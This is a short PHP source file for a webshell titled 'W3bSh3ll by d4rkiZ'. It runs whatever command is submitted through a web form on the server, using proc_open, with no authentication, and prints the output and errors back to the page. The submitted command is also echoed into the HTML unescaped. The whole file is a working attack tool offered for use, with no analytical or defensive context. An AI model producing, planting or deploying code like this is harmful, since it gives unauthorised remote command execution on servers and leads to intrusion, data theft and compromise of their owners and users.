<?php
// Create an interactive and user-friendly PHP webshell

// Define a custom function to execute commands
function execute_command($cmd) {
    // Use proc_open to execute the command
    $descriptors = [
        0 => ['pipe', 'r'], // stdin
        1 => ['pipe', 'w'], // stdout
        2 => ['pipe', 'w']  // stderr
    ];

    $process = proc_open($cmd, $descriptors, $pipes);

    if (is_resource($process)) {
        // Read the output and errors
        $output = stream_get_contents($pipes[1]);
        $errors = stream_get_contents($pipes[2]);

        // Close the pipes
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        // Close the process
        proc_close($process);

        // Prepare the output for HTML display
        $output = htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
        $errors = htmlspecialchars($errors, ENT_QUOTES, 'UTF-8');

        // Output the result in a user-friendly manner
        echo '<pre>';
        echo '<strong>Command:</strong> ' . $cmd . "\n\n";
        echo '<strong>Output:</strong>' . "\n" . $output . "\n";
        echo '<strong>Errors:</strong>' . "\n" . $errors . "\n";
        echo '</pre>';
    }
}

// Check if a command is submitted
if (isset($_POST['command'])) {
    // Get the command from the form submission and execute it
    $command = $_POST['command'];
    execute_command($command);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>W3bSh3ll by d4rkiZ</title>
</head>
<body>
    <h1>W3bSh3ll by d4rkiZ</h1>
    <form method="POST" action="">
        <input type="text" name="command" placeholder="Enter your command">
        <button type="submit">Send</button>
    </form>
</body>
</html>
